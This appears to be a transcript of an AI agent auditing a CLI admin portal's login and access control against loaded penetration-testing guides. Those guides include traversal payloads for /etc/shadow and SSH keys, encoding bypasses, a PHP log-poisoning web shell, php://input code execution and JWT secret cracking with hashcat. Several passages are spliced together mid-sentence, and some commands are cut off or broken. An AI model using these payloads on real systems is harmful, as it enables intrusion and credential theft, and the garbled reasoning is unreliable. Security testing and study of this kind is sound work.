json={\"username\": valid_email, \"password\": \"wrongpassword\"})\nresp_invalid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": invalid_email, \"password\": \"wrongpassword\"})\n\nif resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:\n    print(f\"[MEDIUM] Account enumeration possible:\")\n    print(f\"  Valid user: {resp_valid.status_code} - {resp_valid.text[:100]}\")\n    print(f\"  Invalid user: {resp_invalid.status_code} - {resp_invalid.text[:100]}\")\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Broken Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). An attacker who discovers this secret can\nforge tokens for any user with any role, including admin. Additionally,\ntokens are not revocable - logout does not invalidate the token server-side,\nand the 7-day expiration means stolen tokens remain valid for extended periods.\n\n**Attack Chain**:\n1. Capture any valid JWT from authenticated session\n2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt\n3. Secret recovered in 3 minutes: \"company-jwt-secret-2023\"\n4. Forge admin JWT: modify \"role\" claim to \"admin\", re-sign with discovered secret\n5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. Reduce token TTL to 15 minutes with refresh token rotation\n5. Add `iss` and `aud` claims validation to prevent token misuse across services\n```\n"}]}},{"type":"assistant","uuid":"8357445d-439a-4cdd-8b07-f92b51ef5a5a","session_id":"67ebb3f4-fd3a-4f12-95d0-32d1c299e719","parent_tool_use_id":null,"message":{"id":"8357445d-439a-4cdd-8b07-f92b51ef5a5a","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"This skill is JWT/HTTP API-centric, but its checklist items correspond to this CLI code as follows:\n\n- **Password policy** (Step 6): The skill's test — weak passwords accepted? So the timing of a known account is ~15x slower than unknown → **account existence enumeration via timing** when the CLI iteration count differs from the stored value. This is a real (though subtle) finding: CWE-208 observable timing discrepancy. Severity Low/Medium. It becomes an actual problem precisely in the demo/low-iteration usage pattern, and after a downgrade-rehash… no wait, after rehash the stored value equals the current value. The mismatch only occurs when running with an --iterations different from the stored value. Since the CLI allows any value ≥1000, an attacker who knows the store was provisioned at the 310k default can run with --iterations 1000 and measure: slow = account exists. No — the CLI operates as whoever runs it. The store file is 0600 and owned by the app's uid. A different local user can't run it against that file (can't read the store). So the timing channel requires the same uid, and in that case… if the attacker can run the CLI as the app uid, that means they are the app uid — a threat model the README already treats as a full compromise. No — authenticate is only reachable via login (unauthenticated by design — that's the point of a login). A remote/local attacker calling `login` is exactly the brute-force threat actor. For them, the timing channel: run login with --iterations 1000 (anyone can choose the flag), measure response time. If the account exists (with 310k stored) → ~310k PBKDF2 ≈ slower; unknown → 1000 ≈ fast. **This lets a remote brute-forcer distinguish existing accounts from non-existing ones via timing** — despite the code's explicit design goal (\"response time does not reveal whether the account exists\"). The design only holds when the CLI iteration count equals the stored iteration count. This is a bona fide finding: CWE-208, Medium. The dummy digest should be built/verified at the *stored* iteration count… but for an unknown user there is no stored iteration count. Either direction leaks. ✓ Real finding.\n\n  Hmm, but is there a test that covers \"timing parity\"? This finding is about the *mismatched* iteration path.\n\n- **Token lifecycle / revocation**: The session is in-process, with a 15-minute TTL, revoked on close, and recordAction checks isActive. Since the CLI is one-shot, the session can't be replayed across processes (the token isn't persisted anywhere). ✓ Clean. Actually more precisely: both processes load an empty store; each creates their user and saves the whole file. The final file contains only the last writer's single account. So the operator's bootstrap could be silently replaced by the attacker's account (or vice versa). This is a real race: CWE-367 TOCTOU / CWE-362. Severity Low (requires a local attacker with CLI-execution rights during the very first run — but that's exactly the \"attacker has shell access\" threat model; still, it converts a \"concurrent operation\" into admin-account control). An attacker with a local shell can just delete lockout-state.dat and continue brute-forcing. The README documents \"integrity is only as good as the key\"; the lockout file is the same. Other accounts retain their counts. No problem.\n  - Subtlety 2: after the global backoff expires, `peekGlobal().deadline` is in the past — but is the global state ever cleaned up? registerFailure: `recordFailure(GLOBAL_KEY, null)` increments the count — **is the global count ever reset?** Looking: `lockouts.clearGlobal()` is called on successful login. And when the global threshold is reached, only the triggering key is cleared, not GLOBAL_KEY. So the global count keeps growing across backoffs (20 → 40 → 60…). The deadline is re-set each time count >= 20. So after the first tripping, every subsequent single failure (count 21, 22…) immediately re-triggers the 30-second backoff. Wait: recordFailure increments the count; `if (global.count >= GLOBAL_FAILURE_THRESHOLD)` → setDeadline(30 seconds) every time. So after 20 cumulative failures, every single login failure (from any account) triggers a new 30-second global backoff. The per-account counter for the failing account is cleared each time, but the global count never decreases (except by clearGlobal on successful login). Result: once an attacker has accumulated 20 failures, even a single wrong guess by anyone (or a typo by a legitimate user) triggers a 30-second lockout for everyone. This is an available-behavior quirk: it makes the system more resistant to brute force (good), but also creates a DoS where one mistake by any admin triggers a global lockout (the design intent is that a 20-failure threshold triggers it, but in reality after threshold-crossing even 1 failure triggers it). Is this a security finding? It's a DoS sensitivity (a legitimate typo → 30-second wait for everyone). A functional quirk, Low/informational. Use during authorized penetration tests of file download,\n  view, or include functionality, or when assessing APIs that accept file names or file\n  paths as parameters.\ndomain: cybersecurity\nsubdomain: web-application-security\ntags:\n- penetration-testing\n- directory-traversal\n- path-traversal\n- lfi\n- owasp\n- web-security\nversion: '1.0'\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- ID.RA-01\n- PR.DS-10\n- DE.CM-01\nmitre_attack:\n- T1190\n- T1059.007\n- T1505.003\n- T1083\n---\n\n# Performing Directory Traversal Testing\n\n## When to Use\n\n- During authorized penetration tests when the application handles file paths in URL parameters or request bodies\n- When testing file download, file view, or file include functionality\n- For assessing Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities\n- When evaluating template engines, logging systems, or report generators that reference files\n- During security assessments of APIs that accept file names or paths as parameters\n\n## Prerequisites\n\n- **Authorization**: Written penetration testing agreement for the target\n- **Burp Suite Professional**: For intercepting and modifying file path parameters\n- **ffuf**: For fuzzing file path parameters with traversal payloads\n- **dotdotpwn**: Automated directory traversal fuzzer (`apt install dotdotpwn`)\n- **SecLists**: Traversal payload wordlists from Daniel Miessler's collection\n- **curl**: For manual testing of traversal payloads\n\n## Workflow\n\n### Step 1: Identify File Path Parameters\n\nFind application endpoints that reference files through parameters.\n\n```bash\n# Common file-handling patterns to look for:\n# /download?file=report.pdf\n# /view?page=about.html\n# /api/files?path=documents/invoice.pdf\n# /template?name=header.html\n# /include?module=sidebar\n# /image?src=photos/avatar.jpg\n# /export?format=csv&template=default\n\n# In Burp Suite, search proxy history for file-related parameters\n# Filter by parameter names: file, path, page, template, include,\n# module, src, doc, document, folder, dir, name, filename\n\n# Test with a known valid file to establish baseline\ncurl -s \"https://target.example.com/download?file=report.pdf\" -o /dev/null -w \"%{http_code} %{size_download}\"\n\n# Try referencing a file that shouldn't be accessible\ncurl -s \"https://target.example.com/download?file=../../../etc/passwd\"\n```\n\n### Step 2: Test Basic Directory Traversal Payloads\n\nAttempt to escape the intended directory and read sensitive files.\n\n```bash\n# Linux traversal payloads\nPAYLOADS=(\n  \"../../../etc/passwd\"\n  \"../../../../etc/passwd\"\n  \"../../../../../etc/passwd\"\n  \"../../../../../../etc/passwd\"\n  \"../../../../../../../etc/passwd\"\n  \"..%2f..%2f..%2fetc%2fpasswd\"\n  \"..%252f..%252f..%252fetc%252fpasswd\"\n  \"%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n  \"....//....//....//etc/passwd\"\n  \"..;/..;/..;/etc/passwd\"\n)\n\nfor payload in \"${PAYLOADS[@]}\"; do\n  echo -n \"Testing: $payload -> \"\n  response=$(curl -s \"https://target.example.com/download?file=$payload\")\n  if echo \"$response\" | grep -q \"root:\"; then\n    echo \"VULNERABLE\"\n  else\n    echo \"Blocked\"\n  fi\ndone\n\n# Windows traversal payloads\nWIN_PAYLOADS=(\n  \"..\\..\\..\\windows\\win.ini\"\n  \"..%5c..%5c..%5cwindows%5cwin.ini\"\n  \"..\\/..\\/..\\/windows/win.ini\"\n  \"....\\\\....\\\\....\\\\windows\\\\win.ini\"\n)\n\nfor payload in \"${WIN_PAYLOADS[@]}\"; do\n  echo -n \"Testing: $payload -> \"\n  curl -s \"https://target.example.com/download?file=$payload\" | head -c 100\n  echo\ndone\n```\n\n### Step 3: Apply Encoding and Filter Bypass Techniques\n\nUse various encoding schemes to bypass input validation filters.\n\n```bash\n# URL encoding bypass\ncurl -s \"https://target.example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\"\n\n# Double URL encoding\ncurl -s \"https://target.example.com/download?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd\"\n\n# UTF-8 encoding\ncurl -s \"https://target.example.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\"\n\n# Null byte injection (PHP < 5.3.4)\ncurl -s \"https://target.example.com/download?file=../../../etc/passwd%00.pdf\"\n\n# Path truncation (Windows)\n# Exceeding MAX_PATH (260 chars) to bypass extension checks\nLONG_PATH=\"../../../etc/passwd\"\nfor i in $(seq 1 200); do LONG_PATH=\"${LONG_PATH}/.\"; done\ncurl -s \"https://target.example.com/download?file=$LONG_PATH\"\n\n# Case manipulation (Windows)\ncurl -s \"https://target.example.com/download?file=..\\..\\..\\..\\WiNdOwS\\win.ini\"\n\n# Dot-dot-slash variations\ncurl -s \"https://target.example.com/download?file=....//....//....//etc/passwd\"\ncurl -s \"https://target.example.com/download?file=....//../../../etc/passwd\"\n\n# Using absolute path (if filter only blocks relative traversal)\ncurl -s \"https://target.example.com/download?file=/etc/passwd\"\n```\n\n### Step 4: Automate with ffuf and dotdotpwn\n\nUse automated tools for comprehensive traversal testing.\n\n```bash\n# ffuf with traversal payload list\nffuf -u \"https://target.example.com/download?file=FUZZ\" \\\n  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\\n  -mc 200 \\\n  -fs 0 \\\n  -t 20 -rate 50 \\\n  -o traversal-results.json -of json\n\n# dotdotpwn for systematic traversal testing\ndotdotpwn -m http-url \\\n  -u \"https://target.example.com/download?file=TRAVERSAL\" \\\n  -k \"root:\" \\\n  -o /tmp/dotdotpwn-results.txt \\\n  -d 8 -t 200\n\n# Burp Intruder approach:\n# 1. Send request to Intruder\n# 2. Mark the file parameter value as insertion point\n# 3. Load LFI payload list from SecLists\n# 4. Add Grep Match rules for: \"root:\", \"[extensions]\", \"for 16-bit\"\n# 5. Start attack and review matches\n```\n\n### Step 5: Test Local File Inclusion (LFI) for Code Execution\n\nIf LFI is confirmed, attempt to escalate to remote code execution.\n\n```bash\n# PHP LFI to RCE via log poisoning\n# Step 1: Inject PHP code into access log\ncurl -s -A \"<?php system(\\$_GET['cmd']); ?>\" \\\n  \"https://target.example.com/\"\n\n# Step 2: Include the log file via LFI\ncurl -s \"https://target.example.com/page?file=../../../var/log/apache2/access.log&cmd=id\"\n\n# PHP wrapper for file read (base64 encode to avoid parsing)\ncurl -s \"https://target.example.com/page?file=php://filter/convert.base64-encode/resource=config.php\"\n\n# PHP wrapper for code execution\ncurl -s -X POST \\\n  -d \"<?php system('id'); ?>\" \\\n  \"https://target.example.com/page?file=php://input\"\n\n# PHP data wrapper\ncurl -s \"https://target.example.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\"\n\n# Include /proc/self/environ (if readable)\ncurl -s -A \"<?php phpinfo(); ?>\" \\\n  \"https://target.example.com/page?file=../../../proc/self/environ\"\n\n# Session file inclusion\n# Write PHP code into session via another parameter\n# Then include: /tmp/sess_<PHPSESSID>\n```\n\n### Step 6: Read High-Value Files\n\nTarget sensitive configuration and credential files.\n\n```bash\n# Linux high-value files\nHIGH_VALUE_LINUX=(\n  \"/etc/passwd\"\n  \"/etc/shadow\"\n  \"/etc/hosts\"\n  \"/etc/hostname\"\n  \"/proc/self/environ\"\n  \"/proc/self/cmdline\"\n  \"/var/www/html/.env\"\n  \"/var/www/html/config.php\"\n  \"/var/www/html/wp-config.php\"\n  \"/home/user/.ssh/id_rsa\"\n  \"/home/user/.bash_history\"\n  \"/root/.bash_history\"\n  \"/var/log/auth.log\"\n)\n\nfor file in \"${HIGH_VALUE_LINUX[@]}\"; do\n  traversal=\"../../../../../../..$file\"\n  echo -n \"$file: \"\n  response=$(curl -s \"https://target.example.com/download?file=$traversal\")\n  if [ ${#response} -gt 10 ]; then\n    echo \"READABLE (${#response} bytes)\"\n  else\n    echo \"Not accessible\"\n  fi\ndone\n\n# Windows high-value files\nHIGH_VALUE_WIN=(\n  \"C:\\\\Windows\\\\win.ini\"\n  \"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\"\n  \"C:\\\\inetpub\\\\wwwroot\\\\web.config\"\n  \"C:\\\\Users\\\\Administrator\\\\.ssh\\\\id_rsa\"\n  \"C:\\\\xampp\\\\apache\\\\conf\\\\httpd.conf\"\n  \"C:\\\\xampp\\\\mysql\\\\data\\\\mysql\\\\user.MYD\"\n)\n```\n\n## Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **Directory Traversal** | Using `../` sequences to navigate to parent directories and access files outside the intended path |\n| **Local File Inclusion (LFI)** | Server-side inclusion of local files, potentially leading to code execution |\n| **Remote File Inclusion (RFI)** | Including files from external URLs (requires `allow_url_include=On` in PHP) |\n| **Null Byte Injection** | Using `%00` to truncate file paths, bypassing extension checks in older PHP versions |\n| **PHP Wrappers** | Protocols like `php://filter`, `php://input`, `data://` for reading and executing files |\n| **Log Poisoning** | Injecting code into log files and then including them via LFI for code execution |\n| **Path Canonicalization** | The process of resolving relative paths to absolute paths, which can be exploited |\n\n## Tools & Systems\n\n| Tool | Purpose |\n|------|---------|\n| **Burp Suite Professional** | Request interception and Intruder for automated payload testing |\n| **ffuf** | Fast fuzzing with LFI/traversal wordlists |\n| **dotdotpwn** | Dedicated directory traversal fuzzer with multiple traversal patterns |\n| **LFISuite** | Automated LFI exploitation tool with multiple techniques |\n| **SecLists** | Comprehensive wordlists including LFI payloads and traversal patterns |\n| **Kadimus** | LFI scanning and exploitation tool |\n\n## Common Scenarios\n\n### Scenario 1: File Download Traversal\nA document download endpoint at `/download?file=report.pdf` does not validate the file parameter. Replacing the value with `../../../etc/passwd` returns the server's password file.\n\n### Scenario 2: Template LFI to RCE\nA PHP application includes templates via `?page=home`. T1190\n- T1059.007\n- T1505.003\n- T1083\n- T1068\n---\n\n# Testing for Broken Access Control\n\n## When to Use\n\n- During authorized penetration tests as the primary assessment for OWASP A01:2021 - Broken Access Control\n- When evaluating role-based access control (RBAC) implementations across all application endpoints\n- For testing multi-tenant applications where users in one organization should not access another's data\n- When assessing API endpoints for missing or inconsistent authorization checks\n- During security audits where privilege escalation and unauthorized access are primary concerns\n\n## Prerequisites\n\n- **Authorization**: Written penetration testing agreement for the target\n- **Burp Suite Professional**: With Authorize extension for automated access control testing\n- **Multiple test accounts**: Accounts at each role level (admin, manager, user, guest)\n- **Application role matrix**: Documentation of what each role should and should not access\n- **curl/httpie**: For manual endpoint testing with different authentication contexts\n- **ffuf**: For discovering hidden endpoints that may lack access controls\n\n## Workflow\n\n### Step 1: Map All Endpoints and Create Access Control Matrix\n\nDocument every endpoint and the expected access level for each role.\n\n```bash\n# Extract all endpoints from Burp Site Map\n# Target > Site Map > Right-click > Copy URLs in this host\n\n# Build a matrix of endpoints vs roles:\n# | Endpoint              | Admin | Manager | User | Guest |\n# |-----------------------|-------|---------|------|-------|\n# | GET /admin/dashboard  | Allow | Deny    | Deny | Deny  |\n# | GET /api/users        | Allow | Allow   | Deny | Deny  |\n# | PUT /api/users/{id}   | Allow | Deny    | Own  | Deny  |\n# | DELETE /api/posts/{id} | Allow | Allow   | Own  | Deny  |\n\n# Discover hidden endpoints\nffuf -u \"https://target.example.com/FUZZ\" \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -mc 200,301,302,403 -fc 404 \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -o endpoints.json -of json\n\n# API endpoint discovery\nffuf -u \"https://target.example.com/api/v1/FUZZ\" \\\n  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\\n  -mc 200,201,204,301,302,401,403,405 -fc 404 \\\n  -H \"Authorization: Bearer $USER_TOKEN\"\n```\n\n### Step 2: Configure Automated Access Control Testing\n\nSet up Burp Authorize extension for parallel role-based testing.\n\n```\n# Install Authorize extension:\n# Burp > Extender > BApp Store > Search \"Authorize\" > Install\n\n# Configuration for three-tier testing:\n# 1. Browse the application as Admin (capture all requests)\n# 2. In Authorize tab:\n#    a. Add Regular User's session token in \"Replace cookies/headers\"\n#    b. Optionally add a second row for Unauthenticated (no auth header)\n\n# Example header replacement setup:\n# Row 1 (Low-privilege user):\n#   Cookie: session=low_priv_user_session\n#   Authorization: Bearer low_priv_token\n#\n# Row 2 (Unauthenticated):\n#   [Empty - removes all auth headers]\n\n# Enable interception in Authorize:\n# - Check \"Intercept requests from Proxy\"\n# - Check \"Intercept requests from Repeater\"\n\n# Authorize shows results as:\n# Green  = Properly restricted (different response for different user)\n# Red    = POTENTIALLY VULNERABLE (same response regardless of role)\n# Orange = Uncertain (needs manual verification)\n```\n\n### Step 3: Test Vertical Privilege Escalation\n\nAttempt to access higher-privilege functionality with lower-privilege accounts.\n\n```bash\n# Collect tokens for each role\nADMIN_TOKEN=\"Bearer admin_jwt_here\"\nMANAGER_TOKEN=\"Bearer manager_jwt_here\"\nUSER_TOKEN=\"Bearer user_jwt_here\"\n\n# Test admin endpoints with user token\nADMIN_ENDPOINTS=(\n  \"GET /admin/dashboard\"\n  \"GET /admin/users\"\n  \"POST /admin/users/create\"\n  \"PUT /admin/settings\"\n  \"DELETE /admin/users/5\"\n  \"GET /admin/logs\"\n  \"GET /admin/reports/export\"\n  \"POST /admin/backup\"\n)\n\nfor entry in \"${ADMIN_ENDPOINTS[@]}\"; do\n  method=$(echo \"$entry\" | cut -d' ' -f1)\n  endpoint=$(echo \"$entry\" | cut -d' ' -f2)\n  echo -n \"$method $endpoint (as user): \"\n  status=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n    -X \"$method\" \\\n    -H \"Authorization: $USER_TOKEN\" \\\n    -H \"Content-Type: application/json\" \\\n    \"https://target.example.com$endpoint\")\n  if [ \"$status\" == \"200\" ] || [ \"$status\" == \"201\" ]; then\n    echo \"VULNERABLE ($status)\"\n  else\n    echo \"OK ($status)\"\n  fi\ndone\n\n# Test with method override headers\ncurl -s -o /dev/null -w \"%{http_code}\" \\\n  -X POST \\\n  -H \"Authorization: $USER_TOKEN\" \\\n  -H \"X-HTTP-Method-Override: DELETE\" \\\n  \"https://target.example.com/admin/users/5\"\n\n# Test with different HTTP methods\nfor method in GET POST PUT PATCH DELETE OPTIONS HEAD; do\n  echo -n \"$method /admin/users: \"\n  curl -s -o /dev/null -w \"%{http_code}\" \\\n    -X \"$method\" \\\n    -H \"Authorization: $USER_TOKEN\" \\\n    \"https://target.example.com/admin/users\"\n  echo\ndone\n```\n\n### Step 4: Test Horizontal Privilege Escalation\n\nVerify that users cannot access resources belonging to other users at the same privilege level.\n\n```bash\n# User A (ID: 101) testing access to User B's (ID: 102) resources\nUSER_A_TOKEN=\"Bearer user_a_jwt\"\n\nRESOURCES=(\n  \"/api/users/102/profile\"\n  \"/api/users/102/orders\"\n  \"/api/users/102/messages\"\n  \"/api/users/102/documents\"\n  \"/api/users/102/settings\"\n  \"/api/users/102/payment-methods\"\n)\n\nfor resource in \"${RESOURCES[@]}\"; do\n  echo -n \"GET $resource: \"\n  response=$(curl -s -w \"\\n%{http_code}\" \\\n    -H \"Authorization: $USER_A_TOKEN\" \\\n    \"https://target.example.com$resource\")\n  status=$(echo \"$response\" | tail -1)\n  body_len=$(echo \"$response\" | head -n -1 | wc -c)\n  if [ \"$status\" == \"200\" ] && [ \"$body_len\" -gt 50 ]; then\n    echo \"VULNERABLE ($status, $body_len bytes)\"\n  else\n    echo \"OK ($status)\"\n  fi\ndone\n\n# Test write operations across users\ncurl -s -X PUT \\\n  -H \"Authorization: $USER_A_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"Hacked\",\"email\":\"hacked@evil.com\"}' \\\n \"https://target.example.com/api/users/102/documents/1\" -w \"%{http_code}\"\n```\n\n### Step 5: Test Function-Level Access Control\n\nVerify that specific functions enforce authorization properly.\n\n```bash\n# Test unauthenticated access to protected endpoints\nPROTECTED_ENDPOINTS=(\n  \"/api/user/profile\"\n  \"/api/transactions\"\n  \"/api/settings\"\n  \"/admin/dashboard\"\n  \"/api/export/users\"\n)\n\nfor endpoint in \"${PROTECTED_ENDPOINTS[@]}\"; do\n  echo -n \"No auth: GET $endpoint: \"\n  curl -s -o /dev/null -w \"%{http_code}\" \\\n    \"https://target.example.com$endpoint\"\n  echo\ndone\n\n# Test with expired/invalid tokens\ncurl -s -o /dev/null -w \"%{http_code}\" \\\n  -H \"Authorization: Bearer invalid_token_here\" \\\n \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"new@test.com\",\"password\":\"Test123!\",\"role\":\"admin\"}' \\\n  \"https://target.example.com/api/auth/register\"\n```\n\n### Step resources\nTENANT_A_TOKEN=\"Bearer tenant_a_user_jwt\"\n\n# Direct tenant resource access\ncurl -s -H \"Authorization: $TENANT_A_TOKEN\" \\\n $TENANT_A_TOKEN\" \\\n  -mc 200 -t 10 -rate 20\n```\n\n## Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **Vertical Privilege Escalation** | Lower-privilege user accessing higher-privilege functionality (user -> admin) |\n| **Horizontal Privilege Escalation** | User accessing another user's resources at the same privilege level |\n| **Function-Level Access Control** | Authorization checks on specific features/functions regardless of URL |\n| **RBAC** | Role-Based Access Control - permissions assigned to roles, roles assigned to users |\n| **ABAC** | Attribute-Based Access Control - permissions based on user/resource/environment attributes |\n| **Multi-Tenant Isolation** | Ensuring data and functionality separation between different organizations/tenants |\n| **Insecure Direct Object Reference** | Accessing objects by manipulating identifiers without authorization checks |\n| **Missing Function-Level Check** | Endpoint exists but does not verify the caller has permission to invoke it |\n\n## Tools & Systems\n\n| Tool | Purpose |\n|------|---------|\n| **Burp Suite Professional** | Request interception and role-based testing |\n| **Authorize (Burp Extension)** | Automated access control testing across sessions |\n| **AutoRepeater (Burp Extension)** | Automatically replays requests with different auth contexts |\n| **Postman** | API testing with environment switching between roles |\n| **ffuf** | Discovering hidden endpoints that may lack access controls |\n| **OWASP ZAP** | Access control testing with context-aware scanning |\n\n## Common Scenarios\n\n### Scenario 1: Admin Panel Without Auth Check\nThe `/admin/dashboard` endpoint returns the admin panel when accessed with a regular user's session token. The front-end hides the admin menu, but the back-end does not enforce role checks.\n\n### Scenario 2: API Endpoint Missing Authorization\nThe `DELETE /api/users/{id}` endpoint checks for authentication (valid token) but not authorization (admin role). Any authenticated user can delete any other user's account.\n\n### Scenario 3: Tenant Data Leakage\nA SaaS application uses `tenant_id` in API request headers. Changing the `X-Tenant-ID` header to another tenant's ID returns their data, bypassing tenant isolation.\n\n### Scenario 4: Mass Assignment Role Escalation\nThe user profile update endpoint at `PUT /api/users/{id}` accepts a `role` field in the JSON body. Submitting `\"role\":\"admin\"` alongside a profile update elevates the user to administrator.\n\n## Output Format\n\n```\n## Broken Access Control Assessment Report\n\n**Target**: target.example.com\n**Assessment Date**: 2024-01-15\n**OWASP Category**: A01:2021 - Broken Access Control\n\n### Access Control Matrix Results\n| Endpoint | Admin | Manager | User | Guest | Expected | Actual |\n|----------|-------|---------|------|-------|----------|--------|\n| GET /admin/dashboard | 200 | 200 | 200 | 302 | Admin only | FAIL |\n| DELETE /api/users/{id} | 200 | 200 | 200 | 401 | Admin only | FAIL |\n| GET /api/users/other/profile | 200 | 200 | 200 | 401 | Own only | FAIL |\n| PUT /api/users/other/settings | 200 | 200 | 200 | 401 | Own only | FAIL |\n| GET /api/org/other-tenant | 200 | 200 | 200 | 401 | Same tenant | FAIL |\n\n### Critical Findings\n1. **Vertical Escalation**: Regular users can access /admin/* endpoints\n2. **Horizontal IDOR**: Users can read/modify other users' profiles\n3. **Tenant Isolation**: Cross-tenant data access via header manipulation\n4. **Mass Assignment**: Role escalation via profile update endpoint\n\n### Impact\n- Complete administrative access for any authenticated user\n- Full user data access across all accounts (15,000+ users)\n- Cross-tenant data breach affecting 200+ organizations\n- Account takeover via profile modification\n\n### Recommendation\n1. Implement server-side authorization checks on every endpoint\n2. Use a centralized authorization middleware/framework\n3. Enforce object-level authorization (verify ownership before access)\n4. Validate tenant context server-side, never from client headers\n5. Use allowlists for mass assignment (only permit expected fields)\n6. Implement audit logging for all access control decisions\n```\n"}]}},{"type":"assistant","uuid":"029cb899-5dea-4b40-8738-c6247b582970","session_id":"67ebb3f4-fd3a-4f12-95d0-32d1c299e719","parent_tool_use_id":null,"message":{"id":"029cb899-5dea-4b40-8738-c6247b582970","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"Mapping this skill's methodology (endpoint × privilege matrix, function-level checks, unauthenticated access) to the CLI:\n\nEndpoint matrix (from AdminPortal.run):\n| Command | Unauthenticated | Authenticated (admin) |\n| add-user | **Permitted when store.isEmpty()** (bootstrap) | Permitted (requires privilege) |\n| login | Permitted (the authentication mechanism itself) | Permitted |\n| audit | Rejected (requireAdmin) | Permitted |\n| accounts | Rejected | Permitted |\n| set-password | Rejected | Permitted (targets any account — no self-only restriction; this is by design for admin) |\n| disable/enable/unlock | Rejected | Permitted |\n| verify-log | Permitted (read-only) | Permitted |\n\nFunction-level checks: requireAdmin() runs **inside** the command handler, **before** any privileged store operation — verified per-command (audit: :179, accounts: :191, set-password: :207, disable/enable: :229/:240, unlock: :249). All privileged paths go through requireAdmin. ✓ No function-level omissions.\n\nMass-assignment / role manipulation: `add-user` **always** creates an account with `all privileges` (privilegesFor :424) — there is no way to create a non-admin account, and no \"role\" parameter to manipulate (the user cannot choose their own privilege level — it is fixed by the server-side `privilegesFor`). So no mass-assignment escalation: every user is an admin by design (single role). The skill's scenario 4 does not apply — worth recording as \"verified, not applicable: a single admin role, the privilege set is determined by the server, and the client cannot influence it.\"\n\nUnauthenticated add-user bootstrap: **the sole function-level exception** — the `store.isEmpty()` check at :292. This is the first-run provisioning exception noted earlier, and in light of this skill, it is the only point in the matrix where an unauthenticated caller reaches a write function. TOCTOU race → two concurrent bootstraps both create accounts, and the last writer wins (AdminUserStore.save replaces the entire file). An attacker who can run the CLI concurrently on first execution can plant their own admin account (or wipe out the operator's account). CWE-362/CWE-367. Severity: Low (local-only, only on first run, requires concurrent execution; but the impact = arbitrary admin account).\n\nHorizontal escalation: there is no notion of per-user objects — an admin can act on any other account (set-password against any target). Single role, so no horizontal tier. The audit trail records who performed the action (actor = the authenticated session's user), so accountability is preserved. ✓ By design.\n\nNo object references manipulable by the client that would
